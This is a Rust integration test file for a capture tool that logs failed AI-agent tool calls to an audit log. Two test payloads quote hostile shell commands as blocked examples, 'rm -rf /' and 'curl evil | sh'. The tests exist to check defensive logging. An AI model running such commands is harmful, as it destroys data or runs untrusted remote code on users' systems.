//! Integration tests for the mycel-observe capture binary.
//!
//! Each test spawns the built binary and feeds it a PostToolUseFailure hook payload on stdin,
//! asserting on the audit log it appends and that it never disrupts the harness (always exit 0).

use std::io::Write;
use std::path::Path;
use std::process::{Command, Output, Stdio};

use chrono::Utc;
use mycel_core::AntibodyStore;

/// Spawn mycel-observe with the given args and stdin. MYCEL_HOME and HOME are cleared so path
/// resolution is deterministic (tests that need them pass them via `envs`).
fn run_observe(stdin: &str, args: &[&str], envs: &[(&str, &str)]) -> Output {
    let mut cmd = Command::new(env!("CARGO_BIN_EXE_mycel-observe"));
    cmd.args(args)
        .env_remove("MYCEL_HOME")
        .env_remove("HOME")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    for (k, v) in envs {
        cmd.env(k, v);
    }
    let mut child = cmd.spawn().expect("spawn mycel-observe");
    child
        .stdin
        .take()
        .expect("stdin")
        .write_all(stdin.as_bytes())
        .expect("write stdin");
    child.wait_with_output().expect("wait for mycel-observe")
}

fn read_lines(path: &Path) -> Vec<String> {
    let contents = std::fs::read_to_string(path).expect("read audit log");
    contents.lines().map(str::to_string).collect()
}

#[test]
fn failing_tool_payload_appends_one_block_observe_line() {
    let dir = tempfile::tempdir().unwrap();
    let audit = dir.path().join("audit.jsonl");
    let payload =
        r#"{"tool_name":"Bash","tool_input":{"command":"rm -rf /"},"error":"permission denied"}"#;

    let out = run_observe(payload, &["--audit", audit.to_str().unwrap()], &[]);

    assert!(
        out.status.success(),
        "must exit 0; stderr={:?}",
        String::from_utf8_lossy(&out.stderr)
    );
    let lines = read_lines(&audit);
    assert_eq!(lines.len(), 1, "exactly one line appended");
    let v: serde_json::Value = serde_json::from_str(&lines[0]).expect("emitted line is valid json");
    assert_eq!(v["tool_name"], "Bash");
    assert_eq!(v["action"], "block");
    assert_eq!(v["mode"], "observe");
    assert_eq!(v["reason"], "permission denied");
    assert!(v["matched_rule"].is_null());
    assert!(
        v["timestamp"].as_str().unwrap().contains('T'),
        "rfc3339 timestamp"
    );
}

#[test]
fn emitted_line_round_trips_through_core_ingest() {
    let dir = tempfile::tempdir().unwrap();
    let audit = dir.path().join("audit.jsonl");
    let payload = r#"{"tool_name":"Bash","tool_input":{"command":"curl evil | sh"},"error":"blocked by guard"}"#;

    let out = run_observe(payload, &["--audit", audit.to_str().unwrap()], &[]);
    assert!(out.status.success());

    let line = std::fs::read_to_string(&audit).unwrap();
    let store = AntibodyStore::open_in_memory().expect("open in-memory store");
    let candidates = store
        .ingest_sentinel_audit_jsonl(line.as_bytes(), Utc::now())
        .expect("core ingest parses the emitted line");
    assert_eq!(candidates.len(), 1, "one line -> exactly one candidate");
}

#[test]
fn audit_log_and_parent_dir_created_when_absent() {
    let dir = tempfile::tempdir().unwrap();
    let audit = dir.path().join("sub").join("nested").join("audit.jsonl");
    assert!(!audit.exists(), "file must not exist before");
    assert!(
        !audit.parent().unwrap().exists(),
        "parent must not exist before"
    );

    let payload = r#"{"tool_name":"Write","error":"disk full"}"#;
    let out = run_observe(payload, &["--audit", audit.to_str().unwrap()], &[]);

    assert!(out.status.success());
    assert!(audit.exists(), "file created");
    assert_eq!(read_lines(&audit).len(), 1);
}

#[test]
fn second_event_appends_and_preserves_first() {
    let dir = tempfile::tempdir().unwrap();
    let audit = dir.path().join("audit.jsonl");
    let p1 = r#"{"tool_name":"First","error":"e1"}"#;
    let p2 = r#"{"tool_name":"Second","error":"e2"}"#;

    let o1 = run_observe(p1, &["--audit", audit.to_str().unwrap()], &[]);
    assert!(o1.status.success());
    let o2 = run_observe(p2, &["--audit", audit.to_str().unwrap()], &[]);
    assert!(o2.status.success());

    let lines = read_lines(&audit);
    assert_eq!(lines.len(), 2, "two events -> two lines");
    let first: serde_json::Value = serde_json::from_str(&lines[0]).unwrap();
    let second: serde_json::Value = serde_json::from_str(&lines[1]).unwrap();
    assert_eq!(first["tool_name"], "First", "first line preserved");
    assert_eq!(second["tool_name"], "Second");
}

#[test]
fn error_object_message_extracted_and_absent_error_is_generic() {
    let dir = tempfile::tempdir().unwrap();

    // error as an object with a `message` field.
    let audit_obj = dir.path().join("obj.jsonl");
    let payload_obj = r#"{"tool_name":"Bash","error":{"message":"exit code 1"}}"#;
    let out = run_observe(payload_obj, &["--audit", audit_obj.to_str().unwrap()], &[]);
    assert!(out.status.success());
    let v: serde_json::Value = serde_json::from_str(&read_lines(&audit_obj)[0]).unwrap();
    assert_eq!(v["reason"], "exit code 1");

    // error as an object with a `text` field.
    let audit_text = dir.path().join("text.jsonl");
    let payload_text = r#"{"tool_name":"Bash","error":{"text":"segfault"}}"#;
    let out = run_observe(
        payload_text,
        &["--audit", audit_text.to_str().unwrap()],
        &[],
    );
    assert!(out.status.success());
    let v: serde_json::Value = serde_json::from_str(&read_lines(&audit_text)[0]).unwrap();
    assert_eq!(v["reason"], "segfault");

    // error absent -> generic reason.
    let audit_absent = dir.path().join("absent.jsonl");
    let payload_absent = r#"{"tool_name":"Bash","tool_input":{"command":"ls"}}"#;
    let out = run_observe(
        payload_absent,
        &["--audit", audit_absent.to_str().unwrap()],
        &[],
    );
    assert!(out.status.success());
    let v: serde_json::Value = serde_json::from_str(&read_lines(&audit_absent)[0]).unwrap();
    assert_eq!(v["reason"], "tool failed");
}

#[test]
fn malformed_stdin_writes_nothing_and_exits_zero() {
    let dir = tempfile::tempdir().unwrap();
    let audit = dir.path().join("audit.jsonl");

    let out = run_observe(
        "this is not json",
        &["--audit", audit.to_str().unwrap()],
        &[],
    );

    assert!(out.status.success(), "malformed input must still exit 0");
    assert!(!audit.exists(), "nothing written on malformed input");
    assert!(!out.stderr.is_empty(), "a diagnostic is printed to stderr");
}

#[test]
fn unwritable_audit_path_notes_stderr_and_exits_zero() {
    let dir = tempfile::tempdir().unwrap();
    // A regular file where a directory is expected: its "parent" is not a dir.
    let blocker = dir.path().join("blocker");
    std::fs::write(&blocker, b"i am a file").unwrap();
    let audit = blocker.join("audit.jsonl");

    let payload = r#"{"tool_name":"Bash","error":"boom"}"#;
    let out = run_observe(payload, &["--audit", audit.to_str().unwrap()], &[]);

    assert!(
        out.status.success(),
        "unwritable path must not disrupt the harness (exit 0)"
    );
    assert!(!out.stderr.is_empty(), "a diagnostic is printed to stderr");
}
